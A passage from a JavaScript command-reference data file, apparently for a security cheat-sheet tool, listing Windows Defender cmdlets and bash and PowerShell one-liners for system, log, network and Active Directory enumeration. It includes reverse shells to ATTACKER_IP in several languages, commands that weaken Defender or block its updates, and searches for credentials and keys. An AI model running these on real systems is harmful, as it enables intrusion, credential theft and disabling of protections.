    ],
    category: 'defender'
  },
  {
    cmd: 'Update-MpSignature',
    desc: 'Update Windows Defender antivirus definitions',
    examples: [
      { usage: 'Update-MpSignature', output: '' },
      { usage: 'Update-MpSignature -UpdateSource MicrosoftUpdateServer', output: '' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Start-MpScan',
    desc: 'Start a Windows Defender scan',
    examples: [
      { usage: 'Start-MpScan -ScanType QuickScan', output: '' },
      { usage: 'Start-MpScan -ScanType FullScan', output: '' },
      { usage: 'Start-MpScan -ScanType CustomScan -ScanPath "C:\\Users\\admin\\Downloads"', output: '' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Add-MpPreference -ExclusionPath',
    desc: 'Add a folder exclusion to Windows Defender scanning',
    examples: [
      { usage: 'Add-MpPreference -ExclusionPath "C:\\Tools"', output: '' },
      { usage: 'Add-MpPreference -ExclusionProcess "myapp.exe"', output: '' },
      { usage: 'Add-MpPreference -ExclusionExtension ".log"', output: '' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Remove-MpPreference -ExclusionPath',
    desc: 'Remove a folder exclusion from Windows Defender',
    examples: [
      { usage: 'Remove-MpPreference -ExclusionPath "C:\\Tools"', output: '' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpComputerStatus',
    desc: 'Display the current status of Windows Defender components',
    examples: [
      { usage: 'Get-MpComputerStatus', output: 'AMEngineVersion                  : 1.1.24010.10\nAMProductVersion                 : 4.18.23110.3\nAMRunningMode                    : Normal\nAMServiceEnabled                 : True\nAMServiceVersion                 : 4.18.23110.3\nAntispywareEnabled               : True\nAntispywareSignatureAge          : 0\nAntispywareSignatureLastUpdated  : 1/20/2024 4:30:00 AM\nAntispywareSignatureVersion      : 1.403.2816.0\nAntivirusEnabled                 : True\nAntivirusSignatureAge            : 0\nAntivirusSignatureLastUpdated    : 1/20/2024 4:30:00 AM\nAntivirusSignatureVersion        : 1.403.2816.0\nBehaviorMonitorEnabled           : True\nComputerID                       : 12345678-ABCD-EFGH-IJKL-123456789012\nComputerState                    : 0\nDefenderSignaturesOutOfDate      : False\nFullScanAge                      : 3\nFullScanEndTime                  : 1/17/2024 2:30:00 AM\nFullScanStartTime                : 1/17/2024 1:00:00 AM\nIoavProtectionEnabled            : True\nIsTamperProtected                : True\nIsVirtualMachine                 : True\nLastFullScanSource               : 2\nLastQuickScanSource              : 2\nNISEnabled                       : True\nNISEngineVersion                 : 1.1.24010.10\nNISSignatureAge                  : 0\nNISSignatureLastUpdated          : 1/20/2024 4:30:00 AM\nNISSignatureVersion              : 1.403.2816.0\nOnAccessProtectionEnabled        : True\nQuickScanAge                     : 0\nQuickScanEndTime                 : 1/20/2024 3:00:00 AM\nQuickScanStartTime               : 1/20/2024 2:30:00 AM\nRealTimeProtectionEnabled        : True\nRealTimeScanDirection            : 0\nTamperProtectionSource           : Signatures' }
    ],
    category: 'defender'
  },
  {
    cmd: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 3 -File',
    desc: 'Run Windows Defender command-line scan on a specific file',
    examples: [
      { usage: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 3 -File C:\\temp\\suspicious.exe', output: 'Scan starting...\nScan finished.\nScanning C:\\temp\\suspicious.exe found no threats.' },
      { usage: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 3 -File C:\\temp\\mimikatz.exe', output: 'Scan starting...\nScan finished.\n\nThreat information\n------------------\nThreat                  : HackTool:Win64/Mikatz!dha\nResources               : 1 total\n    file                : C:\\temp\\mimikatz.exe' }
    ],
    category: 'defender'
  },
  {
    cmd: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -SignatureUpdate',
    desc: 'Update Windows Defender signatures via command line',
    examples: [
      { usage: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -SignatureUpdate', output: 'Signature update started . . .\nSignature update finished.\nNo updates needed.' }
    ],
    category: 'defender'
  },
  {
    cmd: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Restore -All',
    desc: 'Restore all quarantined items from Windows Defender',
    examples: [
      { usage: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Restore -ListAll', output: 'ThreatID                  : 2147723890\nThreatName                : HackTool:Win64/Mikatz!dha\nSeverity                  : Severe\nPath                      : C:\\Users\\admin\\Downloads\\mimikatz.exe\nResourcecount             : 1' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpThreatCatalog',
    desc: 'Display the Windows Defender threat definition catalog',
    examples: [
      { usage: 'Get-MpThreatCatalog | Where-Object { $_.SeverityID -eq 5 } | Select-Object -First 5 ThreatName,SeverityID,CategoryID', output: 'ThreatName                              SeverityID CategoryID\n----------                              ---------- ----------\nTrojan:Win32/AgentTesla!ml             5          8\nHackTool:Win64/Mikatz!dha              5          34\nBackdoor:Win32/Cobalt!MSR              5          2\nRansom:Win32/Cerber.A                  5          5\nExploit:Win32/CVE-2021-34527           5          10' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Set-MpPreference -DisableScriptScanning $true',
    desc: 'Disable Windows Defender script scanning',
    examples: [
      { usage: 'Set-MpPreference -DisableScriptScanning $true', output: '' },
      { usage: 'Set-MpPreference -DisableIOAVProtection $true', output: '' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids',
    desc: 'List configured Attack Surface Reduction (ASR) rules',
    examples: [
      { usage: 'Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids,AttackSurfaceReductionRules_Actions', output: 'AttackSurfaceReductionRules_Ids     AttackSurfaceReductionRules_Actions\n-----------------------------------  -----------------------------------\n{75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84,  {1, 1, 1, 1...}\n 3B576869-A4EC-4529-8536-B80A7769E899,\n D4F940AB-401B-4EFC-AADC-AD5F3C50688A,\n 56A863A9-875E-4185-98A7-B882C64B5CE5}' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpPreference | Select-Object SubmitSamplesConsent,MAPSReporting',
    desc: 'Check Windows Defender cloud protection and sample submission settings',
    examples: [
      { usage: 'Get-MpPreference | Select-Object SubmitSamplesConsent,MAPSReporting,CloudBlockLevel,CloudExtendedTimeout', output: 'SubmitSamplesConsent : 1\nMAPSReporting        : 2\nCloudBlockLevel      : 2\nCloudExtendedTimeout : 50' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpPreference | Select-Object -ExpandProperty ExclusionPath',
    desc: 'List all configured Windows Defender path exclusions',
    examples: [
      { usage: 'Get-MpPreference | Select-Object ExclusionPath,ExclusionProcess,ExclusionExtension,ExclusionIpAddress', output: 'ExclusionPath      : {C:\\Tools, C:\\Temp\\test}\nExclusionProcess   : {vmtoolsd.exe}\nExclusionExtension : {.log}\nExclusionIpAddress : {}' }
    ],
    category: 'defender'
  },
  {
    cmd: 'New-NetFirewallRule -DisplayName "Block Defender Updates" -Direction Outbound -RemoteAddress 13.107.4.50 -Action Block',
    desc: 'Create a firewall rule to block Windows Defender update connections (offensive technique)',
    examples: [
      { usage: 'New-NetFirewallRule -DisplayName "Block Defender Updates" -Direction Outbound -Program "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\MsMpEng.exe" -Action Block', output: 'Name                  : {12345678-ABCD-EFGH-IJKL-123456789012}\nDisplayName           : Block Defender Updates\nDescription           :\nDisplayGroup          :\nGroup                 :\nEnabled               : True\nProfile               : Any\nPlatform              : {}\nDirection             : Outbound\nAction                : Block\nEdgeTraversalPolicy   : Block\nLooseSourceMapping    : False\nLocalOnlyMapping      : False\nOwner                 :\nPrimaryStatus         : OK\nStatus                : The rule was parsed successfully from the store.\nEnforcementStatus     : NotApplicable\nPolicyStoreSource     : PersistentStore\nPolicyStoreSourceType : Local' }
    ],
    category: 'defender'
  }
];

const BASH_ONELINERS = [
  // ========== FILE SEARCH (18) ==========
  { desc: "Find SUID binaries", cmd: "find / -perm -4000 -type f 2>/dev/null" },
  { desc: "Find SGID binaries", cmd: "find / -perm -2000 -type f 2>/dev/null" },
  { desc: "Find SUID/SGID binaries", cmd: "find / -perm /6000 -type f 2>/dev/null" },
  { desc: "Find world-writable files", cmd: "find / -perm -o+w -type f 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find world-writable directories", cmd: "find / -perm -o+w -type d 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find files modified in last 24 hours", cmd: "find / -mtime -1 -type f 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find files modified in last 7 days", cmd: "find / -mtime -7 -type f -ls 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find files owned by root writable by others", cmd: "find / -user root -perm -o+w -type f 2>/dev/null" },
  { desc: "Find SSH private keys", cmd: "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null" },
  { desc: "Find config files with passwords", cmd: "grep -rl 'password\\|passwd\\|pwd' /etc/ 2>/dev/null" },
  { desc: "Grep for credentials in common config files", cmd: "grep -rni 'password\\|secret\\|api_key\\|token' /etc/ /opt/ /var/www/ 2>/dev/null" },
  { desc: "Find .git directories", cmd: "find / -name '.git' -type d 2>/dev/null" },
  { desc: "Find files with capability bits set", cmd: "getcap -r / 2>/dev/null" },
  { desc: "Find large files over 100MB", cmd: "find / -size +100M -type f -ls 2>/dev/null" },
  { desc: "Find empty directories", cmd: "find / -type d -empty 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find all .conf and .cfg files", cmd: "find / -name '*.conf' -o -name '*.cfg' 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find recently accessed files (last hour)", cmd: "find / -amin -60 -type f 2>/dev/null | grep -v '/proc\\|/sys'" },
  { desc: "Find files with no owner", cmd: "find / -nouser -o -nogroup 2>/dev/null" },

  // ========== LOG ANALYSIS (16) ==========
  { desc: "Extract failed SSH logins from auth.log", cmd: "grep 'Failed password' /var/log/auth.log | tail -50" },
  { desc: "Extract successful SSH logins", cmd: "grep 'Accepted password\\|Accepted publickey' /var/log/auth.log" },
  { desc: "Count failed logins per IP", cmd: "grep 'Failed password' /var/log/auth.log | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort | uniq -c | sort -rn" },
  { desc: "Extract all unique IPs from a log file", cmd: "grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' /var/log/auth.log | sort -u" },
  { desc: "Monitor auth.log in real-time", cmd: "tail -f /var/log/auth.log | grep --line-buffered 'Failed\\|Accepted\\|Invalid'" },
  { desc: "Parse Apache access log for status codes", cmd: "awk '{print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn" },
  { desc: "Find top 20 requesting IPs in access log", cmd: "awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20" },
  { desc: "Extract 404 requests from Nginx log", cmd: "awk '$9 == 404 {print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn" },
  { desc: "Check for sudo privilege escalation in logs", cmd: "grep -i 'sudo\\|su\\[' /var/log/auth.log | grep -v 'session opened\\|session closed'" },
  { desc: "Monitor syslog for kernel messages", cmd: "tail -f /var/log/syslog | grep --line-buffered 'kernel'" },
  { desc: "Extract URLs from access logs", cmd: "awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -30" },
  { desc: "Find log entries within a time range", cmd: "awk '/^Sep  7 10:00/,/^Sep  7 11:00/' /var/log/syslog" },
  { desc: "Count log events per hour", cmd: "awk '{print $1\" \"$2\" \"substr($3,1,2)\":00\"}' /var/log/syslog | sort | uniq -c" },
  { desc: "Detect brute force patterns (10+ failures from same IP)", cmd: "grep 'Failed password' /var/log/auth.log | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort | uniq -c | awk '$1>=10'" },
  { desc: "Extract user agents from Apache log", cmd: "awk -F'\"' '{print $6}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20" },
  { desc: "Find POST requests in web server logs", cmd: "grep '\"POST ' /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -rn" },

  // ========== NETWORK (18) ==========
  { desc: "TCP port scan with bash (top ports)", cmd: "for port in 21 22 23 25 53 80 110 143 443 445 993 995 3306 3389 8080; do (echo >/dev/tcp/$1/$port) 2>/dev/null && echo \"$port open\"; done" },
  { desc: "Full TCP port scan with bash", cmd: "for port in $(seq 1 65535); do (echo >/dev/tcp/$1/$port) 2>/dev/null && echo \"$port open\"; done" },
  { desc: "Banner grab with netcat", cmd: "echo '' | nc -w3 -v TARGET 22 2>&1" },
  { desc: "Bash reverse shell", cmd: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" },
  { desc: "Python reverse shell", cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
  { desc: "Perl reverse shell", cmd: "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
  { desc: "Netcat reverse shell", cmd: "nc -e /bin/sh ATTACKER_IP 4444" },
  { desc: "Netcat reverse shell (no -e flag)", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f" },
  { desc: "ARP scan on local subnet", cmd: "for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && arp -a 192.168.1.$i; done" },
  { desc: "DNS zone transfer attempt", cmd: "dig axfr @NAMESERVER DOMAIN" },
  { desc: "Subdomain brute force with dig", cmd: "while read sub; do dig +short \"$sub.DOMAIN\" | grep -v '^$' && echo \"$sub.DOMAIN\"; done < subdomains.txt" },
  { desc: "Reverse DNS lookup sweep", cmd: "for i in $(seq 1 254); do host 192.168.1.$i 2>/dev/null | grep 'name pointer'; done" },
  { desc: "Capture traffic on interface (tcpdump)", cmd: "tcpdump -i eth0 -w capture.pcap -c 1000" },
  { desc: "Show all active network connections", cmd: "ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null" },
  { desc: "Enumerate open ports on localhost", cmd: "ss -tlnp | awk 'NR>1 {print $4}' | grep -oP '\\d+$' | sort -un" },
  { desc: "HTTP request with bash (no curl/wget)", cmd: "exec 3<>/dev/tcp/TARGET/80; echo -e 'GET / HTTP/1.1\\r\\nHost: TARGET\\r\\n\\r\\n' >&3; cat <&3; exec 3>&-" },
  { desc: "Socat reverse shell", cmd: "socat TCP:ATTACKER_IP:4444 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane" },
  { desc: "Scan for SMB shares on subnet", cmd: "for i in $(seq 1 254); do smbclient -L //192.168.1.$i -N 2>/dev/null && echo \"=== 192.168.1.$i ===\"; done" },

  // ========== PROCESS (12) ==========
  { desc: "List all running processes with full command line", cmd: "ps auxww" },
  { desc: "Monitor new process creation in real time", cmd: "while true; do ps -eo pid,ppid,user,args --sort=-start_time | head -5; sleep 1; done" },
  { desc: "Find processes running as root", cmd: "ps -eo pid,user,args | awk '$2==\"root\"'" },
  { desc: "Display process tree", cmd: "ps auxf --sort=-pcpu" },
  { desc: "Find processes with open network connections", cmd: "lsof -i -P -n | grep ESTABLISHED" },
  { desc: "Detect processes running from /tmp or /dev/shm", cmd: "ls -la /proc/*/exe 2>/dev/null | grep -E '/tmp/|/dev/shm/'" },
  { desc: "Show process capabilities", cmd: "for pid in /proc/[0-9]*/status; do grep -l 'CapEff:\\s*[^0]' \"$pid\" 2>/dev/null; done" },
  { desc: "List open files by process", cmd: "lsof -p PID" },
  { desc: "Find processes with deleted binaries", cmd: "ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'" },
  { desc: "Show loaded shared libraries for a process", cmd: "cat /proc/PID/maps | grep '\\.so' | awk '{print $6}' | sort -u" },
  { desc: "Check for processes hiding from ps", cmd: "diff <(ps aux | awk '{print $2}' | sort -n) <(ls /proc | grep -E '^[0-9]+$' | sort -n)" },
  { desc: "Monitor CPU-intensive processes", cmd: "ps -eo pid,ppid,user,%cpu,%mem,args --sort=-%cpu | head -20" },

  // ========== ENCODING (12) ==========
  { desc: "Base64 encode a string", cmd: "echo -n 'text_to_encode' | base64" },
  { desc: "Base64 decode a string", cmd: "echo 'dGV4dF90b19lbmNvZGU=' | base64 -d" },
  { desc: "URL encode a string", cmd: "python3 -c \"import urllib.parse; print(urllib.parse.quote('string to encode'))\"" },
  { desc: "URL decode a string", cmd: "python3 -c \"import urllib.parse; print(urllib.parse.unquote('string%20to%20decode'))\"" },
  { desc: "Hex encode a string", cmd: "echo -n 'text' | xxd -p" },
  { desc: "Hex decode a string", cmd: "echo '74657874' | xxd -r -p" },
  { desc: "ROT13 encode/decode", cmd: "echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'" },
  { desc: "Generate MD5 hash", cmd: "echo -n 'text' | md5sum | awk '{print $1}'" },
  { desc: "Generate SHA256 hash", cmd: "echo -n 'text' | sha256sum | awk '{print $1}'" },
  { desc: "Generate SHA1 hash", cmd: "echo -n 'text' | sha1sum | awk '{print $1}'" },
  { desc: "Parse X.509 certificate details", cmd: "openssl x509 -in cert.pem -text -noout" },
  { desc: "Decode JWT token (payload)", cmd: "echo 'JWT_TOKEN' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool" },

  // ========== DATA EXTRACTION (17) ==========
  { desc: "Extract email addresses from a file", cmd: "grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' FILE" },
  { desc: "Extract IP addresses from a file", cmd: "grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' FILE" },
  { desc: "Extract URLs from a file", cmd: "grep -oP 'https?://[^\\s\"'\\''><]+' FILE" },
  { desc: "Extract IPv6 addresses from a file", cmd: "grep -oP '([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}' FILE" },
  { desc: "Parse CSV and extract specific column", cmd: "awk -F',' '{print $2}' file.csv" },
  { desc: "Parse JSON field with jq", cmd: "cat file.json | jq -r '.fieldName'" },
  { desc: "Extract unique domains from URL list", cmd: "grep -oP 'https?://([^/]+)' urls.txt | sort -u" },
  { desc: "Dump MySQL database to file", cmd: "mysqldump -u USER -p DATABASE > dump.sql" },
  { desc: "Extract usernames from /etc/passwd", cmd: "cut -d: -f1 /etc/passwd" },
  { desc: "Extract users with login shells", cmd: "grep -v 'nologin\\|false' /etc/passwd | cut -d: -f1,7" },
  { desc: "Extract metadata from image file", cmd: "exiftool image.jpg" },
  { desc: "Extract strings from binary file", cmd: "strings -n 8 binary_file | grep -i 'pass\\|user\\|key\\|secret'" },
  { desc: "Carve base64-encoded data from file", cmd: "grep -oP '[A-Za-z0-9+/]{20,}={0,2}' FILE | while read b; do echo \"$b\" | base64 -d 2>/dev/null; echo; done" },
  { desc: "Extract phone numbers from file", cmd: "grep -oP '\\+?\\d[\\d\\s\\-()]{8,}\\d' FILE" },
  { desc: "Extract hashes (MD5/SHA1/SHA256) from file", cmd: "grep -oP '[a-fA-F0-9]{32,64}' FILE" },
  { desc: "SQLite database dump", cmd: "sqlite3 database.db '.dump'" },
  { desc: "Extract HTTP headers from pcap", cmd: "tcpdump -A -r capture.pcap | grep -E '^(GET|POST|Host|Cookie|Authorization):'" },

  // ========== PERSISTENCE AND ENUMERATION (12) ==========
  { desc: "List all cron jobs for all users", cmd: "for user in $(cut -d: -f1 /etc/passwd); do echo \"=== $user ===\"; crontab -l -u $user 2>/dev/null; done" },
  { desc: "Check system-wide cron directories", cmd: "ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null" },
  { desc: "List systemd timers (cron alternatives)", cmd: "systemctl list-timers --all" },
  { desc: "Find writable files in PATH directories", cmd: "echo $PATH | tr ':' '\\n' | while read d; do find \"$d\" -writable -type f 2>/dev/null; done" },
  { desc: "Check for PATH hijacking opportunities", cmd: "echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"Writable: $d\"; done" },
  { desc: "Enumerate startup scripts", cmd: "find /etc/init.d/ /etc/rc*.d/ /etc/systemd/system/ -type f -ls 2>/dev/null" },
  { desc: "Find writable systemd service files", cmd: "find /etc/systemd /lib/systemd -writable -name '*.service' 2>/dev/null" },
  { desc: "Check sudo configuration", cmd: "sudo -l 2>/dev/null" },
  { desc: "Find NOPASSWD sudo entries", cmd: "grep -r 'NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null" },
  { desc: "Inspect environment variables for secrets", cmd: "env | grep -i 'pass\\|key\\|secret\\|token\\|api'" },
  { desc: "List all .bashrc and .profile files", cmd: "find /home /root -name '.bashrc' -o -name '.bash_profile' -o -name '.profile' 2>/dev/null | xargs grep -l 'alias\\|export\\|PATH' 2>/dev/null" },
  { desc: "Enumerate at jobs", cmd: "atq 2>/dev/null; ls -la /var/spool/at/ 2>/dev/null" },

  // ========== SYSTEM INFO (15) ==========
  { desc: "Full OS fingerprint", cmd: "cat /etc/os-release 2>/dev/null || cat /etc/*-release 2>/dev/null" },
  { desc: "Kernel version and architecture", cmd: "uname -a" },
  { desc: "CPU information", cmd: "lscpu" },
  { desc: "Memory information", cmd: "free -h" },
  { desc: "Disk usage overview", cmd: "df -h" },
  { desc: "List block devices", cmd: "lsblk" },
  { desc: "PCI hardware enumeration", cmd: "lspci 2>/dev/null" },
  { desc: "USB devices enumeration", cmd: "lsusb 2>/dev/null" },
  { desc: "Network interfaces and addresses", cmd: "ip addr show 2>/dev/null || ifconfig -a 2>/dev/null" },
  { desc: "Routing table", cmd: "ip route 2>/dev/null || route -n 2>/dev/null" },
  { desc: "ARP cache", cmd: "ip neigh 2>/dev/null || arp -a 2>/dev/null" },
  { desc: "DNS resolver configuration", cmd: "cat /etc/resolv.conf" },
  { desc: "Loaded kernel modules", cmd: "lsmod" },
  { desc: "Hostname and domain information", cmd: "hostname -f; hostnamectl 2>/dev/null" },
  { desc: "Installed packages (Debian/RHEL)", cmd: "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null" },
];


const POWERSHELL_ONELINERS = [
  // ========== AD ENUMERATION (18) ==========
  { desc: "List all domain admins", cmd: "Get-ADGroupMember -Identity 'Domain Admins' -Recursive | Select-Object Name,SamAccountName" },
  { desc: "List all enterprise admins", cmd: "Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | Select-Object Name,SamAccountName" },
  { desc: "Enumerate all domain users", cmd: "Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Enabled,LastLogonDate,PasswordLastSet" },
  { desc: "Enumerate all domain computers", cmd: "Get-ADComputer -Filter * -Properties * | Select-Object Name,OperatingSystem,LastLogonDate,IPv4Address" },
  { desc: "Enumerate all domain groups", cmd: "Get-ADGroup -Filter * | Select-Object Name,GroupScope,GroupCategory" },
  { desc: "List all GPOs in the domain", cmd: "Get-GPO -All | Select-Object DisplayName,GpoStatus,CreationTime,ModificationTime" },
  { desc: "Enumerate domain trusts", cmd: "Get-ADTrust -Filter * | Select-Object Name,Direction,TrustType,IntraForest" },
  { desc: "Find all SPNs for kerberoasting", cmd: "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName" },
  { desc: "Find AS-REP roastable accounts", cmd: "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName" },
  { desc: "Enumerate users with unconstrained delegation", cmd: "Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object SamAccountName" },
  { desc: "Enumerate computers with unconstrained delegation", cmd: "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name" },
  { desc: "Find accounts with constrained delegation", cmd: "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo | Select-Object Name,msDS-AllowedToDelegateTo" },
  { desc: "Enumerate domain password policy", cmd: "Get-ADDefaultDomainPasswordPolicy" },
  { desc: "List users with password never expires", cmd: "Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | Select-Object SamAccountName" },
  { desc: "Find disabled accounts", cmd: "Get-ADUser -Filter {Enabled -eq $false} | Select-Object SamAccountName,DistinguishedName" },
  { desc: "Enumerate ACLs on a specific AD object", cmd: "(Get-Acl 'AD:\\CN=AdminSDHolder,CN=System,DC=domain,DC=local').Access | Select-Object IdentityReference,ActiveDirectoryRights" },
  { desc: "Find users who can DCSync", cmd: "Get-ObjectAcl -DistinguishedName 'DC=domain,DC=local' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication'} | Select-Object IdentityReference" },
  { desc: "List all OUs in the domain", cmd: "Get-ADOrganizationalUnit -Filter * | Select-Object Name,DistinguishedName" },

  // ========== REGISTRY (12) ==========
  { desc: "Check Run key autoruns (HKLM)", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' 2>$null" },
  { desc: "Check Run key autoruns (HKCU)", cmd: "Get-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' 2>$null" },
  { desc: "Check RunOnce keys", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' 2>$null; Get-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' 2>$null" },
  { desc: "Enumerate all autorun locations", cmd: "Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User" },
  { desc: "Check Winlogon persistence", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object Shell,Userinit" },
  { desc: "Enumerate installed software from registry", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate" },
  { desc: "Check audit policy settings", cmd: "auditpol /get /category:*" },
  { desc: "Enumerate USB device history", cmd: "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\*\\*' | Select-Object FriendlyName,DeviceDesc" },
  { desc: "Check recent documents (per user)", cmd: "Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Recent\" | Sort-Object LastWriteTime -Descending | Select-Object Name,LastWriteTime -First 20" },
  { desc: "Check Image File Execution Options (debugger hijack)", cmd: "Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' | ForEach-Object { Get-ItemProperty $_.PSPath -Name Debugger -ErrorAction SilentlyContinue }" },
  { desc: "Query service configurations from registry", cmd: "Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Services' | ForEach-Object { Get-ItemProperty $_.PSPath | Select-Object PSChildName,ImagePath,Start,ObjectName } | Where-Object {$_.ImagePath}" },
  { desc: "Check AppInit DLLs", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows' | Select-Object AppInit_DLLs,LoadAppInit_DLLs" },

  // ========== SERVICES (12) ==========
  { desc: "List all running services", cmd: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name,DisplayName,StartType" },
  { desc: "Find unquoted service paths", cmd: "Get-CimInstance Win32_Service | Where-Object {$_.PathName -notmatch '^\"|^\\''' -and $_.PathName -match '.* .*\\\\.exe'} | Select-Object Name,PathName,StartMode" },
  { desc: "Check service permissions with accesschk", cmd: "Get-CimInstance Win32_Service | ForEach-Object { $acl = sc.exe sdshow $_.Name 2>$null; if($acl -match 'RP'){[pscustomobject]@{Name=$_.Name;SDDL=$acl}} }" },
  { desc: "Find services running as SYSTEM", cmd: "Get-CimInstance Win32_Service | Where-Object {$_.StartName -match 'LocalSystem'} | Select-Object Name,PathName,State" },
  { desc: "Enumerate scheduled tasks", cmd: "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select-Object TaskName,TaskPath,State | Format-Table -AutoSize" },
  { desc: "Get scheduled task details with actions", cmd: "Get-ScheduledTask | ForEach-Object { [pscustomobject]@{Name=$_.TaskName;Action=$_.Actions.Execute;Args=$_.Actions.Arguments;RunAs=$_.Principal.UserId} }" },
  { desc: "Find writable service binary paths", cmd: "Get-CimInstance Win32_Service | ForEach-Object { $p=$_.PathName -replace '\"',''; $p=$p.Split(' ')[0]; if((Get-Acl $p -ErrorAction SilentlyContinue).Access | Where-Object {$_.FileSystemRights -match 'Write|FullControl'}){$_.Name+': '+$p} }" },
  { desc: "List services with manual start type", cmd: "Get-Service | Where-Object {$_.StartType -eq 'Manual'} | Select-Object Name,Status,DisplayName" },
  { desc: "Find DLL hijacking candidates in services", cmd: "Get-CimInstance Win32_Service | Where-Object {$_.PathName -match '\\.exe'} | ForEach-Object { $dir=Split-Path ($_.PathName -replace '\"','').Split(' ')[0]; if(Test-Path $dir){[pscustomobject]@{Name=$_.Name;Dir=$dir;Writable=(Get-Acl $dir).Access}} }" },
